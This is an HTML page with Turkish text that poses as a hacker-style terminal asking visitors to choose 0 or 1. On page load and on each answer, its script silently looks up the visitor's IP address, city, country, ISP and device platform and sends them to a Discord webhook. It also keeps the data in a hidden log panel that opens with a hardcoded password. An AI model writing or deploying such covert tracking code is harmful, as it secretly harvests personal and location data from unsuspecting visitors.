<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>TERMINAL_BY_LEXUS</title>
    <style>
        body { background-color: #000; color: #1aff1a; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; text-shadow: 0 0 5px #1aff1a; }
        #terminal { width: 90%; max-width: 800px; }
        input { background: transparent; border: none; color: #1aff1a; font-family: inherit; font-size: 1.1rem; outline: none; width: 100%; }
        .system-msg { color: #ff0000; font-weight: bold; }
        .getir-msg { color: #ffffff; margin: 10px 0; }
        #admin-panel { 
            position: fixed; top: 10px; right: 10px; width: 280px; height: 300px;
            border: 1px solid #ff00ff; background: rgba(20, 0, 20, 0.95); 
            padding: 10px; font-size: 0.7rem; color: #ff00ff; 
            display: none; overflow-y: auto; z-index: 1000;
            box-shadow: 0 0 15px rgba(255, 0, 255, 0.2);
        }
        .log-entry { border-bottom: 1px solid #330033; padding: 5px 0; }
    </style>
</head>
<body>

<div id="admin-panel">
    <div style="border-bottom: 1px solid #ff00ff; font-weight: bold; margin-bottom: 5px;">[LEXUS_DATABASE_VAULT]</div>
    <div id="log-content"></div>
    <button onclick="localStorage.clear(); location.reload();" style="background:none; border:1px solid red; color:red; cursor:pointer; font-size:0.6rem; margin-top:10px;">LOGLARI SIFIRLA</button>
</div>

<div id="terminal">
    <div id="output"></div>
    <div id="input-line">
        <span id="prompt"></span>
        <input type="text" id="userInput" autofocus autocomplete="off">
    </div>
</div>

<script>
    const WEBHOOK_URL = "BURAYA_WEBHOOK_URL_GELECEK";
    const output = document.getElementById('output');
    const userInput = document.getElementById('userInput');
    const logContent = document.getElementById('log-content');

    // --- KALICI DEPOLAMA MANTIĞI ---
    function saveLogLocally(logEntry) {
        let logs = JSON.parse(localStorage.getItem('lexus_logs') || '[]');
        logs.push(logEntry);
        localStorage.setItem('lexus_logs', JSON.stringify(logs));
        renderLogs();
    }

    function renderLogs() {
        let logs = JSON.parse(localStorage.getItem('lexus_logs') || '[]');
        logContent.innerHTML = logs.map(l => `<div class="log-entry">${l}</div>`).reverse().join('');
    }

    async function sendFullIntelligence(action) {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();
            const time = new Date().toLocaleTimeString();
            const logText = `[${time}] ${action}: ${d.ip} (${d.city})`;
            
            // 1. Kalıcı olarak tarayıcıya kaydet
            saveLogLocally(logText);

            // 2. Discord'a anlık gönder
            const payload = {
                username: "LEXUS_DATABASE",
                embeds: [{
                    title: `SİSTEM HAREKETİ: ${action}`,
                    color: 16711935,
                    fields: [
                        { name: "🌐 IP", value: d.ip, inline: true },
                        { name: "📍 KONUM", value: `${d.city}/${d.country_name}`, inline: true },
                        { name: "🏢 SAĞLAYICI", value: d.org, inline: false },
                        { name: "📱 CİHAZ", value: navigator.platform, inline: true }
                    ],
                    timestamp: new Date()
                }]
            };
            fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
        } catch (e) {}
    }

    const lines = [
        "[SYSTEM] VERİTABANI BAĞLANTISI KURULDU...",
        "Kimiz biz? Biz bir takımız. İstanbul'dan.",
        "--------------------------------------------------",
        "Sistem kölesi misin (0), yoksa dünyayı değiştiren mi (1)?"
    ];

    let i = 0;
    function typeWriter() {
        if (i < lines.length) {
            let p = document.createElement('p');
            p.className = i === 0 ? 'system-msg' : 'getir-msg';
            p.innerText = lines[i];
            output.appendChild(p);
            i++;
            setTimeout(typeWriter, 500);
        } else {
            document.getElementById('prompt').innerText = "Giriş > ";
        }
    }

    window.onload = () => {
        typeWriter();
        renderLogs(); // Sayfa açılınca eski logları yükle
        sendFullIntelligence("SİSTEME GİRİŞ");
    };

    userInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            const val = userInput.value.trim().toLowerCase();
            userInput.value = "";

            if (val === 'lexuscxnnn113') {
                document.getElementById('admin-panel').style.display = "block";
                return;
            }

            if (val === '0' || val === '1') {
                output.innerHTML += `<p style="color:yellow;">> Analiz tamamlanıyor...</p>`;
                sendFullIntelligence(`SEÇİM: ${val}`);
            }
        }
    });
</script>
</body>
</html>
